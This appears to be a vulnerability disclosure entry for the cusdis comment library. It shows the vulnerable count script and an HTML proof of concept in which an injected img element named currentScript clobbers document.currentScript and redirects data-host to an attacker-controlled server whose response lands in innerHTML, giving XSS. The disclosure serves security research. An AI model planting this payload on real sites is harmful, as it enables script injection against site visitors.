## cusdis

### Meta

+ Library: cusdis
+ Stars: 2.6K
+ Version: v1.3.0
+ Payload: ```<img name="currentScript" data-host="https://xxx.xxx.xxx">```
+ Impact: XSS
+ CVE: CVE-2024-XXXXX
+ Status: Reported(MITRE)
+ Foundby: TheHulk


### Library

https://github.com/djyde/cusdis


### Vulnerable Code Snippet

```javascript
async function n() {
  const e = document.currentScript || document.querySelector("#for-testing")
    , {appId: n, host: r} = e.dataset
    , a = r || "https://cusdis.com"
    , o = document.querySelectorAll("*[data-cusdis-count-page-id]")
    , i = Array.from(o).map((e => e.dataset.cusdisCountPageId))
    , s = await t.get(`${a}/api/open/project/${n}/comments/count`, {
      params: {
          pageIds: i
      }
  });
  Array.from(o).forEach((e => {
      e.innerHTML = s.data.data[e.dataset.cusdisCountPageId]
  }
  ))
}
```

### PoC
```html

<!--Library-->
<span data-cusdis-count-page-id="XXX-YYY-ZZZ">0</span> comments
<div id="cusdis_thread"
  data-host="https://cusdis.com"
  data-app-id="c157400c-80eb-4dca-acc7-3cd342adfb22"
  data-page-id="XXX-YYY-ZZZ"
  data-page-url="XXX"
  data-page-title="XXX"></div>
</div>
<script async defer src="https://cusdis.com/js/cusdis.es.js"></script>
<script defer data-host="https://cusdis.com" data-app-id="c157400c-80eb-4dca-acc7-3cd342adfb22" src="https://cusdis.com/js/cusdis-count.umd.js"></script>
<!--Library-->

<!--Payload-->
<img name="currentScript" data-host="http://localhost:9999">
<!--Payload-->
```